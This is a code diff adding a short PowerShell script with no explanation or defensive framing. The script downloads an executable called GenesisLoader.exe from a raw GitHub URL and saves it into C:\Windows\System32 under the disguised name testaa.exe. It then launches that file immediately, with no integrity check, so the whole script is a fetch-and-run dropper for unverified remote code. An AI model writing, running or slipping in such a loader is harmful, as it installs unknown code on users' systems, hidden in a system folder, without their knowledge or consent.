@@ -1,0 +1,18 @@
+$exeUrl = "https://raw.githubusercontent.com/RollbakIsOnline/Puls/main/GenesisLoader.exe"
+$exePath = "C:\Windows\System32\testaa.exe"
+
+Write-Host "Downloading..." -ForegroundColor Cyan
+
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFileAsync($exeUrl, $exePath)
+
+while ($wc.IsBusy) {
+    Start-Sleep -Milliseconds 1000
+}
+
+if (Test-Path $exePath) {
+    Write-Host "Completed..." -ForegroundColor Green
+    Start-Process $exePath
+} else {
+    Write-Host "Download failed..." -ForegroundColor Red
+}
